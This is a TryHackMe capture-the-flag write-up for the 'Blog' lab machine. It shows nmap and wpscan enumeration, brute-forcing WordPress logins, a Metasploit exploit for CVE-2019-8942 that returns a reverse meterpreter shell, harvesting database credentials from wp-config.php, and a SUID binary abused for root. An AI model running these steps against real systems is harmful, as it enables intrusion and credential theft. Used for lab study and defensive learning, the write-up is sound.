# TryHackMe — Blog

**IP:** `10.144.176.176`  
**By:** Obada (Xenos)  
**Platform:** TryHackMe  
**Difficulty:** Medium

---

## Reconnaissance

### Hosts Setup

```bash
sudo nano /etc/hosts
# Added: 10.144.176.176 blog.thm
```

### Nmap Scan

```bash
sudo nmap -sCV -O -T4 -A -Pn blog.thm -oN nmap-result.nmap
```

**Results:**

| Port | State | Service |
|------|-------|---------|
| 22/tcp | open | SSH |
| 80/tcp | open | HTTP |
| 139/tcp | open | Samba smbd 3.X - 4.X |
| 445/tcp | open | Samba smbd 4.7.6-Ubuntu |

The HTTP service revealed a **WordPress** website.

---

## WordPress Enumeration

Using `wpscan` for vulnerability and user enumeration:

```bash
wpscan --url http://blog.thm/ -e
```

**Findings:**
- WordPress version **5.0**
- Users discovered: `kwheel`, `bjoel`

### Brute-Force Login

```bash
wpscan --url http://blog.thm/wp-login.php \
  -U kwheel,bjoel \
  -P /usr/wordlists/rockyou.txt
```

**Valid credentials found:**
- Username: `kwheel`
- Password: `cutiepie1`

---

## Initial Access

WordPress 5.0 is vulnerable to **CVE-2019-8942** — an authenticated RCE via the image crop feature.

Using Metasploit:

```bash
use multi/http/wp_crop_rce
set RHOST 10.144.176.176
set LHOST 192.168.136.92
set PASSWORD cutiepie1
set USERNAME kwheel
run
```

Shell obtained as `www-data`:

```
meterpreter > pwd
/var/www/wordpress
```

---

## Post-Exploitation Enumeration

### Home Directory

```
meterpreter > ls /home/bjoel

Billy_Joel_Termination_May20-2020.pdf
user.txt
```

```
meterpreter > cat /home/bjoel/user.txt
You won't find what you're looking for here.
TRY HARDER
```

The real `user.txt` is elsewhere — noted for later.

### wp-config.php — Credential Harvesting

```bash
cat /var/www/wordpress/wp-config.php
```

```php
define('DB_NAME',     'blog');
define('DB_USER',     'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST',     'localhost');
```

Attempted SSH with `bjoel:LittleYellowLamp90!@` — **failed**. Password reuse did not apply here.

---

## Privilege Escalation

### SUID Binary Discovery

Dropped into a full shell and searched for SUID binaries:

```bash
shell
python -c "import pty; pty.spawn('/bin/bash')"
find / -perm -u=s -type f 2>/dev/null
```

Among standard binaries, one stood out:

```
/usr/sbin/checker   ← non-standard SUID binary
```

### Analyzing the Binary

```bash
/usr/sbin/checker
# Output: Not an Admin

strings /usr/sbin/checker
```

Key strings extracted:

```
getenv
admin
system
/bin/bash
Not an Admin
```

### Understanding the Vulnerability

The binary logic (reconstructed from `strings` output):

```c
char *val = getenv("admin");   // checks for env variable named "admin"

if (val != NULL) {
    setuid(0);                 // escalate to root
    system("/bin/bash");       // spawn root shell
} else {
    puts("Not an Admin");
}
```

The binary checks whether an environment variable named `admin` **exists** — it doesn't validate its value at all.

### Exploitation

```bash
admin=1 /usr/sbin/checker
```

This sets a temporary environment variable `admin=1` scoped to the `checker` process. The binary finds it, calls `setuid(0)`, and spawns a root shell.

```
root@blog:/var/www/wordpress# whoami
root
```

---

## Flags

### root.txt

```bash
cat /root/root.txt
```

```
9a0b2b618bef9bfa7ac28c1353d9f318
```

### user.txt (real location)

The flag was not in `/home/bjoel/user.txt` — it was mounted on a USB:

```bash
find / -name user.txt 2>/dev/null
# ./home/bjoel/user.txt   ← fake
# ./media/usb/user.txt    ← real
```

```bash
cat /media/usb/user.txt
```

```
c8421899aae571f7af486492b71a8ab7
```

---

## Summary

| Step | Technique |
|------|-----------|
| Enumeration | Nmap + WPScan |
| Initial Access | WordPress 5.0 RCE (CVE-2019-8942) via Metasploit |
| PrivEsc | SUID binary `checker` — environment variable injection |
| Root | `setuid(0)` + `/bin/bash` triggered by `admin` env var |

---

*Write-up by Obada (Xenos) — [github.com/obadahamed](https://github.com/obadahamed)*
